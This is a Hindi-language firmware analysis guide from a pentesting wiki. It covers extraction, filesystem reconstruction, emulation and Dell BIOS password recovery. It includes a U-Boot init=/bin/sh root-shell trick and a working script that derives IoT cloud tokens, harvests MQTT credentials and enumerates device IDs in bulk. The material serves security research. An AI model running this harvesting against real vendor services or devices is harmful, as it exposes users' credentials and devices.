# फर्मवेयर विश्लेषण

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **परिचय**

### संबंधित संसाधन

एक्सपोज़्ड हार्डवेयर इंटरफ़ेस से डेटा प्राप्त करने के लिए, [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) और [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) देखें। कंसोल एक्सेस से पहले, बूट के समय दोहराए जा सकने वाले UART capture के लिए, [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) देखें।

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

फर्मवेयर वह आवश्यक सॉफ़्टवेयर है जो हार्डवेयर कंपोनेंट्स और उपयोगकर्ताओं के साथ इंटरैक्ट करने वाले सॉफ़्टवेयर के बीच संचार को प्रबंधित और सुगम बनाकर डिवाइस को सही ढंग से काम करने में सक्षम बनाता है। यह स्थायी मेमोरी में संग्रहीत होता है, जिससे डिवाइस चालू होते ही आवश्यक निर्देशों को एक्सेस कर सकता है और ऑपरेटिंग सिस्टम लॉन्च हो सकता है। सुरक्षा कमजोरियों की पहचान करने के लिए फर्मवेयर की जाँच करना और उसमें संभावित बदलाव करना एक महत्वपूर्ण कदम है।<sup>[[2]](#references)[[3]](#references)</sup>

## **जानकारी एकत्र करना**

**जानकारी एकत्र करना** किसी डिवाइस की संरचना और उसमें उपयोग की गई तकनीकों को समझने का एक महत्वपूर्ण शुरुआती कदम है। इस प्रक्रिया में निम्नलिखित डेटा एकत्र किया जाता है:

- CPU आर्किटेक्चर और उस पर चलने वाला ऑपरेटिंग सिस्टम
- बूटलोडर की विशिष्ट जानकारी
- हार्डवेयर लेआउट और डेटाशीट
- कोडबेस के मेट्रिक्स और सोर्स लोकेशन
- बाहरी लाइब्रेरी और लाइसेंस के प्रकार
- अपडेट का इतिहास और नियामक प्रमाणन
- आर्किटेक्चर और फ़्लो डायग्राम
- सुरक्षा आकलन और पहचानी गई कमजोरियाँ

इस काम के लिए **open-source intelligence (OSINT)** टूल बेहद उपयोगी हैं। उपलब्ध open-source सॉफ़्टवेयर कंपोनेंट्स का मैन्युअल और ऑटोमेटेड समीक्षा प्रक्रियाओं के ज़रिए विश्लेषण करना भी उपयोगी है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे टूल मुफ़्त static analysis देते हैं, जिनका उपयोग संभावित समस्याएँ खोजने के लिए किया जा सकता है।

## **फर्मवेयर प्राप्त करना**

फर्मवेयर प्राप्त करने के कई तरीके हैं, जिनमें से हर तरीके की जटिलता अलग-अलग होती है:

- सोर्स (डेवलपर या निर्माता) से **सीधे**
- दिए गए निर्देशों के अनुसार **बिल्ड करके**
- आधिकारिक सपोर्ट साइटों से **डाउनलोड करके**
- होस्ट की गई फर्मवेयर फ़ाइलें खोजने के लिए **Google dork** क्वेरी का उपयोग करके
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे टूल की मदद से **cloud storage** को सीधे एक्सेस करके
- man-in-the-middle तकनीकों से **अपडेट इंटरसेप्ट करके**
- **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash), या **PICit** जैसे कनेक्शन के ज़रिए डिवाइस से **एक्सट्रैक्ट करके**
- डिवाइस कम्युनिकेशन में अपडेट अनुरोधों को **स्निफ़ करके**
- **हार्डकोड किए गए अपडेट एंडपॉइंट** की पहचान करके और उनका उपयोग करके
- बूटलोडर या नेटवर्क से **डंप करके**
- बाकी सभी तरीके विफल होने पर, उपयुक्त हार्डवेयर टूल का उपयोग करके स्टोरेज चिप **निकालकर और पढ़कर**

### केवल UART लॉग: Flash में U-Boot env के ज़रिए root shell को बाध्य करना

अगर UART RX को अनदेखा किया जाता है (सिर्फ़ लॉग मिलते हैं), तब भी **U-Boot environment blob को ऑफ़लाइन एडिट करके** init shell को बाध्य किया जा सकता है:<sup>[[6]](#references)</sup>

1. SOIC-8 क्लिप और प्रोग्रामर (3.3V) से SPI flash डंप करें:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partition का पता लगाएँ, `bootargs` को edit करके उसमें `init=/bin/sh` शामिल करें, और blob के लिए **U-Boot env CRC32 को फिर से compute करें**।
3. केवल env partition को reflash करें और reboot करें; UART पर एक shell दिखाई देनी चाहिए।

यह उन embedded devices पर उपयोगी है जहाँ bootloader shell disabled है, लेकिन external flash access के ज़रिए env partition writable है।

## firmware का विश्लेषण

अब जब आपके पास **firmware है**, तो आपको इसके बारे में जानकारी extract करनी होगी, ताकि पता चल सके कि इसके साथ कैसे काम करना है। इसके लिए आप अलग-अलग tools का उपयोग कर सकते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

अगर इन tools से ज़्यादा जानकारी न मिले, तो `binwalk -E <bin>` से image की **entropy** जाँचें। अगर entropy कम है, तो संभवतः यह encrypted नहीं है। अगर entropy ज़्यादा है, तो संभवतः यह encrypted है (या किसी तरह compressed है)।

इसके अलावा, आप इन tools का इस्तेमाल **firmware के अंदर embedded files** निकालने के लिए कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file का निरीक्षण करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का उपयोग कर सकते हैं।

### External flash में raw display assets

External SPI dump में ज़रूरी नहीं कि MCU का executable firmware ही हो। Cortex-M target के लिए, हर संभावित code region की शुरुआत की तुलना device memory map से करें: सामान्य vector table की शुरुआत में SRAM का एक संभावित stack pointer और executable memory में reset-handler address होता है। Offset zero पर vector table न होना अपने-आप यह साबित नहीं करता कि पूरी chip में code नहीं है; दूसरे offsets और boot arrangement की भी जाँच करें। अगर `binwalk` को कोई container न मिले, तो raw bytes का निरीक्षण करें और [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) से flash read addresses को नई screens लोड करने वाली क्रियाओं से मिलाएँ।<sup>[[14]](#references)</sup>

Display-asset region के लिए PNG/JPEG मान लेने के बजाय pixel formats और dimensions के संभावित विकल्प आज़माएँ। उद्धृत device में **80×160 RGB565 little-endian** frames का उपयोग किया गया था: प्रति pixel दो bytes होने के कारण, एक frame **25,600 bytes** (25 KiB) का होता है, 24 kilobits का नहीं। Decoded flash-read address से screen asset का offset मिला; researcher ने एक तैयार image को `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` से convert किया, original dump में उतने ही आकार के asset को बदला, उसे `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` से लिखा, और display पर नई image की पुष्टि की। यह writable *external display assets* को दर्शाता है, MCU के internal firmware को extract या reflash करना नहीं। किसी भी write से पहले original dump सुरक्षित रखें और dimensions, byte order, offset, तथा replacement length की पुष्टि करें।<sup>[[14]](#references)</sup>

### Differential flash analysis और recoverable XOR secret stores

जब किसी firmware setting का storage format documented न हो, तो पहले कई matching flash reads लें, **ठीक एक** setting बदलें, chip का पूरा dump फिर से लें, और offsets की तुलना करें। Controlled values के साथ प्रयोग दोहराने से setting को counters और write metadata से अलग पहचाना जा सकता है; अगर बदलाव वहीं होने के बजाय नए offsets पर दिखें, तो store append-only या log-structured हो सकता है। Deleted/tombstoned entries को बनाए रखें, क्योंकि उनके payload bytes अभी भी recover किए जा सकते हैं।<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

क्षेत्र का पता लगाने के बाद, `binwalk` जैसे tools से firmware modules निकालें और Ghidra में writer/validator को reverse करें। ciphertext patterns से scheme का केवल अनुमान लगाने के बजाय, code में field boundaries, padding, key indexing और key derivation की पुष्टि करें।<sup>[[12]](#references)</sup>

#### encrypted zero padding से keys रिकवर करें

जैसा कि [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) में बताया गया है, known plaintext से उन्हीं offsets पर keystream bytes का पता चलता है। एक fixed-size field विशेष रूप से तब exposed होता है जब उसकी zero padding, repeating XOR key के हर index को कवर करती है: encrypted padding सीधे उन key bytes को उजागर करती है, क्योंकि `0x00 XOR key_byte = key_byte`। यदि key का हर index कवर हो, तो ciphertext के tail से key को reconstruct करें और भरे हुए bytes को decrypt करें।<sup>[[12]](#references)</sup>

Dell का vulnerable DVAR BIOS-password format इसका ठोस उदाहरण है: 32-byte field का byte `0` plaintext होता है, जबकि bytes `1..31` में repeating 20-byte key का इस्तेमाल होता है।<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

पासवर्ड की लंबाई `L` होने पर, XOR से पहले स्थितियाँ L..31 शून्य थीं। जब `L <= 12` होता है, तो ये स्थितियाँ हर key index को कवर करती हैं, इसलिए brute force के बिना पूरी key और पासवर्ड रिकवर किए जा सकते हैं:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### ऐतिहासिक रिकॉर्ड से keys निकालें

हर रिकॉर्ड का स्वतंत्र रूप से विश्लेषण न करें। DVAR key लगभग `modified_md5(device_seed || variable_GUID || password[0])` से derive होती है: device seed और GUID निश्चित होते हैं, और password पर निर्भर एकमात्र input उसका clear पहला byte होता है। इससे प्रति device अधिकतम 256 keys बनती हैं और एक ही byte से शुरू होने वाले रिकॉर्ड एक key साझा करते हैं। उस byte के आधार पर active और deleted रिकॉर्ड को समूहित करें; एक छोटा ऐतिहासिक रिकॉर्ड padding के माध्यम से पूरी key leak कर सकता है और ऐसे मौजूदा लंबे रिकॉर्ड को decrypt कर सकता है जिसकी अपनी padding पर्याप्त न हो। इसलिए, पुराने ciphertext को मिटाने के बजाय tombstone करने पर password rotation exposure बढ़ा सकता है।<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) tool DVAR का पता लगाता है, candidate रिकॉर्ड को validate करता है, passwords recover करता है और raw stored/key bytes दिखा सकता है। इसे checkout से build करें और verified flash image को इस तरह scan करें:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

कस्टम parsers के लिए, record structure, printable-character constraints, zero-padding checks, key entropy और key के wrap होने पर consistency का उपयोग करके false positives को अस्वीकार करें। अगर बार-बार लिए गए dumps में हर write पर sparse bit flips दिखें, तो देखे गए masks की सूची बनाएँ और इन constraints के आधार पर संभावित corrections को क्रम दें; लेकिन heuristic output को exact recovery के रूप में दिखाने के बजाय अस्पष्ट characters की जानकारी दें।<sup>[[12]](#references)</sup>

Password verifiers में reversible ciphertext के बजाय salted, iterated one-way hash store किया जाना चाहिए, और log-structured stores को superseded secret material को सुरक्षित रूप से हटाना चाहिए।<sup>[[12]](#references)</sup>

### फ़ाइल सिस्टम प्राप्त करना

पिछले बताए गए tools, जैसे `binwalk -ev <bin>`, का उपयोग करके आपको **फ़ाइल सिस्टम निकालने** में सक्षम होना चाहिए था।\
Binwalk आमतौर पर इसे **फ़ाइल सिस्टम के प्रकार के नाम वाले folder** में निकालता है। आमतौर पर ये प्रकार होते हैं: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### फ़ाइल सिस्टम को मैन्युअल रूप से निकालना

कभी-कभी, binwalk के signatures में **फ़ाइल सिस्टम का magic byte नहीं होता**। ऐसे मामलों में, binwalk का उपयोग करके **फ़ाइल सिस्टम का offset ढूँढें और binary से compressed फ़ाइल सिस्टम को carve करें**, फिर नीचे दिए गए चरणों के अनुसार उसके प्रकार के आधार पर **फ़ाइल सिस्टम को मैन्युअल रूप से निकालें**।

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs filesystem को carve करने के लिए निम्नलिखित **dd command** चलाएँ।

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

वैकल्पिक रूप से, निम्नलिखित command भी चलाई जा सकती है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद फ़ाइलें "`squashfs-root`" directory में होंगी।

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs filesystems के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Split embedded root filesystems को फिर से बनाना

अगर raw eMMC/SSD dump में valid filesystem header हो, लेकिन उसके metadata offsets nominal partition से आगे तक जाते हों, तो उसे तुरंत corrupt न मानें। Embedded boot code Device Mapper के ज़रिए कई physical ranges से असली root device assemble कर सकता है, इसलिए एक GPT partition को carve करने पर केवल पहला segment मिलता है।<sup>[[9]](#references)</sup>

#### पूरे media image की जाँच करें

पहले पुष्टि करें कि acquisition पूरा हो चुका है, size स्थिर है और कोई writer अब भी image को hold नहीं कर रहा है। अगर filename में start/end address दिए गए हैं, तो उस range की तुलना वास्तविक byte count से करें। GPT को read-only mode में recover करें और केवल आवश्यक range attach करें; workstation पर किसी untrusted physical volume के विरुद्ध `vgchange -ay` **न चलाएँ**, क्योंकि volume-group collisions और अनचाहे writes हो सकते हैं।<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

जब original init logic या LVM stack को पूरी image देखनी हो, तो disposable VM का उपयोग करें। Standard boot partition के पुराने boot logs खास तौर पर उपयोगी होते हैं: bootloader ने proprietary-container offsets, component lengths, slot selection, alignment rules और signature verification लॉग किए हो सकते हैं। इन values का उपयोग करके embedded command line/kernel/initramfs को carve करें, फिर हर output को `file`, magic bytes और `binwalk` से स्वतंत्र रूप से validate करें; container के अंत तक पढ़ने से गलती से kernel के साथ initrd, ACPI object या signature भी जुड़ सकता है।<sup>[[9]](#references)</sup>

#### Boot-time block map को पुनर्प्राप्त करें

Kernel का initramfs extract करें और उसके `/init` तथा किसी भी storage libraries को reverse करें। [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) में, `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` और partition paths के string references खोजें; फिर उस code को trace करें जो active A/B slot चुनता है और table बनाता है। radare2 के उपयोगी शुरुआती commands हैं `r2 -A init`, `afl`, `pdf @ main` और `pdf @ fcn.xxxxx`।<sup>[[9]](#references)</sup>

Linear target, virtual device की लगातार ranges को एक या अधिक backing devices की ranges पर map करता है। पुनर्प्राप्त की गई दो-segment table का सामान्य स्वरूप इस तरह होता है (सभी positions और lengths 512-byte sectors में हैं):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Machine-code की arithmetic को बिल्कुल वैसा ही दोहराएँ, जिसमें integer width, shifts और unit conversions शामिल हैं। उदाहरण के लिए, निम्न expression byte size को पहले 4-KiB boundary तक नीचे round करता है और उसके बाद ही उसे 512-byte sectors में बदलता है; इसे `p4_bytes // 512` से बदलने पर, जब भी partition page-aligned न हो, चुना गया tail `p4_bytes % 4096` से खिसक जाता है।<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

तालिका के क्रम में सीमित आकार के chunks कॉपी करके, पूरी media dump को memory में लोड किए बिना एक flat analysis image का पुनर्निर्माण करें। इससे host-side mapper devices बनाने से भी बचा जा सकता है। GPT से निकले offsets, उलटी sector counts और परिणामस्वरूप मिलने वाली output length को अलग-अलग assertions के रूप में रखें।<sup>[[9]](#references)</sup>

#### Corruption और स्थिर reconstruction त्रुटि में अंतर करें

SquashFS के लिए, `unsquashfs` चलाने से पहले `hsqs` magic की जाँच करें और superblock के offset 40 पर मौजूद little-endian 64-bit `bytes_used` field को decode करें। यदि कई असंबंधित structures में extraction विफल हो, तो अपेक्षित positions के आसपास की एक विस्तृत window में खोजें और मजबूत structural candidates की पुष्टि करें: decompressible metadata block, लगातार कई valid directory entries, संभावित inode fields, inode count के अनुरूप root inode, या valid integrity-metadata structure। केवल एक magic match पर्याप्त नहीं है।<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

जब वही signed delta स्वतंत्र संरचनाओं को वैध बनाता है—उदाहरण के लिए, directory metadata और verity record—तो संभावित कारण bytes का गायब होना नहीं, बल्कि segment-start की व्यवस्थित त्रुटि है। Orphan recovery करने या filesystem metadata पैच करने से पहले, उलटी गणना पर लौटें और देखें कि कहीं शेषफल हटाए तो नहीं गए, signedness या overflow की समस्या तो नहीं है, या sector/page rounding तो नहीं हुई।<sup>[[9]](#references)</sup>

अंत में, सुरक्षा सीमाओं को अलग-अलग रखें: TPM-sealed LUKS volumes डेटा की गोपनीयता की रक्षा करते हैं, जबकि signed dm-verity mapping root-filesystem की अखंडता की रक्षा करती है। Software TPM, मूल physical TPM से seal की गई key को पुनः प्राप्त नहीं कर सकता। इसी तरह, verity verification को छोड़ने वाले research-only init के ज़रिए संशोधित SquashFS को boot करने से उसका signature forge नहीं होता और न ही dm-verity टूटता है।<sup>[[9]](#references)</sup>

## Firmware का विश्लेषण

Firmware प्राप्त होने के बाद, उसकी संरचना और संभावित कमजोरियों को समझने के लिए उसका विश्लेषण करना आवश्यक है। इस प्रक्रिया में firmware image का विश्लेषण करने और उससे उपयोगी डेटा निकालने के लिए विभिन्न टूल का उपयोग किया जाता है।

### प्रारंभिक विश्लेषण टूल

Binary file (जिसे `<bin>` कहा गया है) के शुरुआती निरीक्षण के लिए commands का एक समूह दिया गया है। ये commands file types की पहचान करने, strings निकालने, binary data का विश्लेषण करने और partition तथा filesystem के विवरण समझने में मदद करते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

इमेज की encryption स्थिति का आकलन करने के लिए, `binwalk -E <bin>` से **entropy** जाँची जाती है। कम entropy encryption की कमी का संकेत देती है, जबकि ज़्यादा entropy संभावित encryption या compression दर्शाती है।

**embedded files** निकालने के लिए, **file-data-carving-recovery-tools** documentation और फ़ाइलों की जाँच के लिए **binvis.io** जैसे tools और resources की सिफ़ारिश की जाती है।

### Filesystem निकालना

`binwalk -ev <bin>` का इस्तेमाल करके आम तौर पर filesystem निकाला जा सकता है, अक्सर filesystem के प्रकार (जैसे, squashfs, ubifs) के नाम वाली directory में। हालाँकि, अगर magic bytes मौजूद न होने की वजह से **binwalk** filesystem के प्रकार को पहचानने में विफल रहता है, तो उसे manually निकालना ज़रूरी होता है। इसमें `binwalk` से filesystem का offset ढूँढ़ना और फिर filesystem को carve out करने के लिए `dd` command का इस्तेमाल करना शामिल है:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

बाद में, filesystem के प्रकार (जैसे squashfs, cpio, jffs2, ubifs) के अनुसार, contents को manually extract करने के लिए अलग-अलग commands का उपयोग किया जाता है।

### Filesystem का विश्लेषण

Filesystem extract हो जाने के बाद, security flaws की खोज शुरू होती है। असुरक्षित network daemons, hardcoded credentials, API endpoints, update server की functionalities, uncompiled code, startup scripts और offline analysis के लिए compiled binaries पर ध्यान दिया जाता है।

निरीक्षण के लिए **मुख्य स्थानों** और **items** में शामिल हैं:

- User credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- संभावित vulnerabilities के लिए configuration और script files
- आगे के analysis के लिए embedded binaries
- आम IoT device web servers और binaries

Filesystem में संवेदनशील जानकारी और vulnerabilities ढूँढ़ने में कई tools मदद करते हैं:

- संवेदनशील जानकारी खोजने के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- व्यापक firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) और [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries पर Security Checks

Filesystem में मिलने वाले source code और compiled binaries—दोनों की vulnerabilities के लिए जाँच की जानी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools ऐसे unprotected binaries की पहचान करने में मदद करते हैं जिनका exploit किया जा सकता है।

## Derived URL tokens के ज़रिए cloud config और MQTT credentials हासिल करना

कई IoT hubs हर device का configuration ऐसे cloud endpoint से fetch करते हैं:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान आपको पता चल सकता है कि `<token>` को device ID और hardcoded secret का उपयोग करके स्थानीय रूप से derive किया जाता है, उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) और uppercase hex के रूप में दर्शाया जाता है

इस design के कारण, deviceId और STATIC_KEY जानने वाला कोई भी व्यक्ति URL को फिर से बना सकता है और cloud config प्राप्त कर सकता है, जिसमें अक्सर plaintext MQTT credentials और topic prefixes सामने आ जाते हैं।

व्यावहारिक प्रक्रिया:

1) UART boot logs से deviceId निकालें

- 3.3V UART adapter (TX/RX/GND) कनेक्ट करें और logs capture करें:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- ऐसी लाइनों को खोजें जो cloud config URL pattern और broker address प्रिंट करती हों, उदाहरण के लिए:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware से STATIC_KEY और token algorithm पुनर्प्राप्त करें

- Binaries को Ghidra/radare2 में लोड करें और config path ("/pf/") या MD5 के उपयोग को खोजें।
- Algorithm की पुष्टि करें (जैसे, MD5(deviceId||STATIC_KEY))।
- Bash में token निकालें और digest को uppercase में बदलें:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) cloud config और MQTT credentials हासिल करें

- URL बनाएं और curl से JSON प्राप्त करें; secrets निकालने के लिए jq से parse करें:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) plaintext MQTT और कमजोर topic ACLs (यदि मौजूद हों) का दुरुपयोग करें

- प्राप्त credentials का उपयोग करके maintenance topics को subscribe करें और संवेदनशील घटनाओं की तलाश करें:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Predictable device IDs को enumerate करें (बड़े पैमाने पर, authorization के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद sequential suffix होता है।
- आप candidate IDs को iterate करके, tokens derive कर सकते हैं और programmatically configs fetch कर सकते हैं:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- Mass enumeration करने का प्रयास करने से पहले हमेशा स्पष्ट authorization प्राप्त करें।
- जब संभव हो, target hardware में बदलाव किए बिना secrets recover करने के लिए emulation या static analysis को प्राथमिकता दें।

Firmware को emulate करने की प्रक्रिया किसी device के operation या किसी individual program का **dynamic analysis** करने में सक्षम बनाती है। इस approach में hardware या architecture dependencies से जुड़ी चुनौतियाँ आ सकती हैं, लेकिन root filesystem या specific binaries को matching architecture और endianness वाले device, जैसे Raspberry Pi, या pre-built virtual machine में transfer करने से आगे की testing आसान हो सकती है।

### Individual Binaries को Emulate करना

Single programs की जाँच के लिए, program की endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture का उदाहरण

MIPS architecture binary को emulate करने के लिए, यह command इस्तेमाल कर सकते हैं:

```bash
file ./squashfs-root/bin/busybox
```

और आवश्यक emulation tools इंस्टॉल करने के लिए:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए `qemu-mipsel` सही विकल्प होगा।

#### ARM Architecture Emulation

ARM binaries के लिए प्रक्रिया समान है; emulation के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) और अन्य टूल full firmware emulation को आसान बनाते हैं। ये प्रक्रिया को automate करते हैं और dynamic analysis में मदद करते हैं।

### Emulation के लिए split और verified root filesystems का पुनर्निर्माण

अगर SquashFS superblock पढ़ा जा सकता है, लेकिन inode, directory या fragment-table offsets असंभव लगते हैं, तो तुरंत `unsquashfs` को patch न करें। शुरुआती boot binary को reverse-engineer करें और उसके द्वारा बनाए गए block-device graph को दोबारा तैयार करें: embedded systems में nominal root partition दिख सकता है, लेकिन असली filesystem `dm-linear` mapping से बनता है, जो किसी दूसरे partition से लिए गए sectors जोड़ती है। केवल superblock की जाँच सफल हो सकती है, भले ही उसके बाद के सभी metadata blocks अपनी जगह से खिसके हुए हों।<sup>[[11]](#references)</sup>

Firmware के arithmetic को बिल्कुल वैसा ही बनाए रखें। खास तौर पर, पता करें कि lengths bytes, 512-byte sectors या 4 KiB pages में हैं; shifts और truncation को उनके मूल क्रम में दोहराएँ; और A/B layouts में bank पर निर्भर tail regions का ध्यान रखें। उदाहरण के लिए, `(partition_bytes >> 12) << 3` पहले मान को 4 KiB boundary तक truncate करता है और उसके बाद ही परिणाम को 512-byte sectors में व्यक्त करता है; इसकी जगह `partition_bytes // 512` का उपयोग करने से जोड़ा गया extent कुछ kilobytes खिसक सकता है और आगे की सभी SquashFS tables corrupt हो सकती हैं।<sup>[[11]](#references)</sup>

जाँच के लिए उपयोगी workflow:<sup>[[11]](#references)</sup>

1. Verifier/init binary से हर `dm-linear` segment का source device, start sector और length पता करें।
2. Alignment semantics बदले बिना extents को concatenate या map करें।
3. अगर extraction फिर भी विफल हो, तो अनुमानित boundary के आसपास के छोटे से window में ही खोजें और केवल plausible superblock को स्वीकार करने के बजाय लगातार कई valid metadata structures की पुष्टि करें।
4. Reconstructed image पर बिना बदलाव वाला `unsquashfs` चलाएँ; सभी directories और fragments को सफलतापूर्वक traverse करना, `unsquashfs -stat` से अधिक ठोस प्रमाण है।

#### Analyst-controlled dm-verity replacement

जब analyst के पास QEMU kernel, initramfs और virtual disks का नियंत्रण हो, तो vendor के verification PID 1 की जगह एक छोटा statically linked init चलाकर modified root को boot किया जा सकता है। यह **lab boot-chain substitution** है, dm-verity, उसके RSA signature, Secure Boot या TPM-sealed key को तोड़ना नहीं।<sup>[[11]](#references)</sup>

